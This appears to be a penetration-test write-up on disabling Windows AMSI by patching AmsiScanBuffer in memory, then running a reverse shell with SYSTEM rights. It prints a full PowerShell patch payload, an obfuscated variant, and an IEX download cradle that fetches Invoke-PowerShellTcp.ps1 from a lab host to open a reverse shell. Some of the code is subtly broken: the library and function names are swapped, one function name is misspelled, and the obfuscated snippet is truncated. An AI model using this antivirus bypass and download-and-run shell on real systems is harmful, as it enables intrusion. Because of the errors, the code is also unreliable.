## Table of Contents
- [**Outline**](#section-0)
- [**Antimalware Scan Interface Explanation**](#section-1)
- [ **Proof of Concept - Bypassing 2023 Windows 10 Pro AMSI**](#section-2)
- [ **Memory Patching & Obfuscation**](#section-3)
- [ **Credits & Reference**](#section-4)


## Outline  {#section-0}

The goal of this write-up is to evade the most up to date AMSI protection measure implemented in Windows 10 Pro (2023/07/28) using AMSI memory patching technique. The objective was to gain a Remote Code Execution (RCE) as NT/Authority System.

![](/assets/AV/diagram.png)  

AMSI (Antimalware Scan Interface) is a Windows feature introduced in Windows 10 and Windows Server 2016. Its primary purpose is to provide an interface that allows antivirus and other security solutions to scan and inspect scripts and code in real-time at runtime.

By default, windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution. When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space.  `AmsiScanBuffer()`and `AmsiScanString()` are used by the antivirus before execution to scan the buffer and strings for suspicious activities. This ultimately prevents arbitrary execution of code.
# AMSI Evasion {#section-1}
The following evasive techniques aim to avoid detection by antivirus and security software.  

##### Code Fragmentation: 
Code fragmentation involves breaking down malicious code into smaller, seemingly harmless components. This is then assembled at runtime to evade static analysis.
This approach challenges antivirus scanners that rely on signature-based detection.

##### Obfuscation: 
Obfuscation techniques are utilized to deliberately obscure the actual intent and functionality of a script. By employing various obfuscation methods, such as code encryption, renaming variables, adding meaningless code snippet to obscure intent of the script, attackers can make their code appear convoluted. This makes AMSI scanners challenging  to interpret the true purpose of the script.

#####  Memory Patching: 
Memory patching modifies the AMSI Dynamic Link Library (DLL) in memory during runtime. This technique allows threat actors to temporarily disable or alter the functionality of AMSI. Subsequently attackers can run malicious scripts in memory without hindrance and alerts
#### PowerShell Downgrade: 
PowerShell downgrading is switching the current PowerShell to Windows PowerShell verison 2.0. This version does not have AMSI protection, which makes it susceptible to arbitrary code execution. By using an older version of PowerShell, attackers can bypass the built-in security measures present in newer versions and execute malicious scripts undetected.
## Proof of Concept {#section-2}

![](/assets/AV/Final.gif)  

To verify that AMSI is correctly functioning, the tester first tried to initiate a reverse TCP connection through PowerShell using the below command in memory.
```bash
IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
```
However, as seen above, AMSI successfully flags the activity as  `malicious` and proceeds to block the reverse shell connection. 
## Memory Patching  {#section-3}
In order to bypass AMSI, the tester utilized the following payload which was referenced from [Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass)
```bash
$thing = @"

using System;
using System.Runtime.InteropServices;
public class payload {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
"@
Add-Type $thing
[System.Collections.ArrayList]$Patch = 0xB8, 0x57, 0x90, 0x90, 0x00, 0x90, 0x07, 0x80, 0x90, 0xC3
$Patch.Remove(0x90)
$Patch.Remove(0x90)
$Patch.Remove(0x90)
$Patch.Remove(0x90)

[byte[]]$byteArrayFun = "","","","","",""
$byteArrayFun[0] = $Patch[0]
$byteArrayFun[1] = $Patch[1]
$byteArrayFun[2] = $Patch[2]
$byteArrayFun[3] = $Patch[3]
$byteArrayFun[4] = $Patch[4]
$byteArrayFun[5] = $Patch[5]

$to = "Am" +"s" + "iSc" + "a" + "nBu" + "ffer"
$connect = "a" + "m" + "si" + ".dl" + "l"
$librarz = [payload]::LoadLibrary($to)
$dest = [payload]::GetProcAddress($librarz, $connect)
$p = 0
[payload]::VirtualProtect($dest, [uint32]5, 0x40, [ref]$p)

[System.Runtime.InteropServices.Marshal]::Copy($byteArrayFun, 0, $dest, 6)
```


By applying a patch to the `AmsiScanBuffer` function in `AMSI.dll`, using specific assembly code (mov eax, 0x80070057 and ret), the function promptly returns an error code. This effectively avoides AMSI from scanning the PowerShell code. This method allows the attacker's  to execute PowerShell code in memory without triggering AMSI's detection.

However, it is essential to acknowledge that the above memory patching payload might be flagged by ASMI before it could patch the `ASMIScanBuffer.dll` itself. Thus it is necessary to implement proper obfuscation methodologies before delivering the payload. To conceal the payload's content and intention, the tester opted to utilize Chameleon PowerShell Obfuscator. Chameleon is a specialized tool designed to obfuscate PowerShell scripts and circumvent AMSI and commercial antivirus solutions. It employs a range of obfuscation techniques to evade common detection signatures, thereby enhancing its effectiveness in avoiding detection. Examples of obfuscation methods include but are not limited to comment deletion/substitution
string substitution (variables, functions, data-types) ,variable concatenation ,indentation randomization ,semi-random backticks insertion and randomization.

The below code snippet contains a payload that has undergone multiple layers of obfuscation.
```bash
$GFW2Au7XbmPG5GvoODmvtYOpODkUS2KZR095wx8IHiPJu4eatfAA885Px56TcF0MnqghrNzM42Lvz0LE4IzoWJzpj7ML2MZ11evXUFDQD589KWR9QtwKq2Qg0mE6uMREzx7iRIZJOK2qLeZKpRqZslro01qcJC03aScqnLmSiSVJ6AIwZKGZF1aEaYGjS13PQyKmRdpmc2yMyISCN1yYuQCBZkF5i2LKBOpm7FcEshpWYz6QTzs9m5WNt6PONU73eoXpVQZKAbDUydPdN2ZdTeNdkOjDZHErYeh5b0Tqq9N = @"
// thing 
// using syStEm.CoLLeCtiONS.ArrAyLiST;
using System; // thingssa
using System.Runtime.InteropServices;
public class payload {
      [DllImport("kernel32")]
      public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
       public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
"@
Add-Type $GFW2Au7XbmPG5GvoODmvtYOpODkUS2KZR095wx8IHiPJu4eatfAA885Px56TcF0MnqghrNzM42Lvz0LE4IzoWJzpj7ML2MZ11

```


After implementing effective obfuscation techniques, the payload is dropped in the PowerShell command prompt. The `ASMIScanBuffer.dll` returns an `Invalid Argument` and ends the AMSI program without being able to scan any code. With AMSI neutralized, the tester proceeded by hosting a Python web server on port 8443 to serve a PowerShell Reverse Shell Scrip.
```bash
python3 -m http.server 8443
```

Taking advantage of the payload, the tester successfully initiated a reverse TCP connection via PowerShell, executing the script in memory:
```bash
IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
```
Consequently, the tester achieved a  Remote Code Execution (RCE) with NT/Authority System privileges.
![](/assets/AV/system.png)  

## Reference  {#section-4}
[Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass) && [Pentest Laboratories](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
